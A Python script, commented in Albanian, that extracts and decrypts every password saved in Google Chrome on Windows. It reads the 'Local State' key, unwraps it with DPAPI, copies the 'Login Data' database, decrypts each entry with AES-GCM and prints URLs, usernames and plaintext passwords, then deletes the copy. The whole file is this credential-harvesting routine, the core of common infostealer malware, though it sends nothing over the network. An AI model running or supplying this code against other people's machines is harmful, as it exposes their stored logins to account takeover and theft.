import os
import json
import base64
import platform
import sqlite3
# pip install pypiwin32 komanda per me instalu win32
if platform.system() != 'Linux':
    import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
def browser_date_and_time_chrome(browser_data):
    # Kjo do te kthej nje objekt datetime.datetime ne menyr qe ta marrim kohen qe kur ka ndodhur ruajtja e fjalkalimit
    return datetime(1601, 1, 1) + timedelta(microseconds=browser_data)


def fetching_encryption_key_chrome():
    # Pathi qe eshte ne kompjuterin e shfrytzuesit
    local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")

    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)

    # Dekodimi i qelsit enkriptues duke perdorur base64
    encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])

    # Largimi i "Windows Data Protection API" ose "DPAPI"
    encryption_key = encryption_key[5:]

    # Kthen qelsin e dekriptuar
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def password_decryption_chrome(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]

        # Gjeneron shifren
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)

        # Dekripton fjalkalimin
        return cipher.decrypt(password)[:-16].decode()
    except:

        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return "No Passwords"

def chrome():
    key = fetching_encryption_key_chrome()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "Default", "Login Data")
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)

    # Lidhje ne databaz
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # 'logins' tabela i ka te dhenat
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")

    # Iterimi ne te gjith rreshtat
    for row in cursor.fetchall():
        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption_chrome(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]

        if user_name or decrypted_password:
            print(f"Main URL: {main_url}")
            print(f"Login URL: {login_page_url}")
            print(f"User name: {user_name}")
            print(f"Decrypted Password: {decrypted_password}")

        else:
            continue

        if date_of_creation != 86400000000 and date_of_creation:
            print(f"Creation date: {str(browser_date_and_time_chrome(date_of_creation))}")

        if last_usuage != 86400000000 and last_usuage:
            print(f"Last Used: {str(browser_date_and_time_chrome(last_usuage))}")
        print("=" * 100)
    cursor.close()
    db.close()

    try:
        # Provon te largon kopjen e filit te bazes se dhenave nga kompjuteri
        os.remove(filename)
    except:
        pass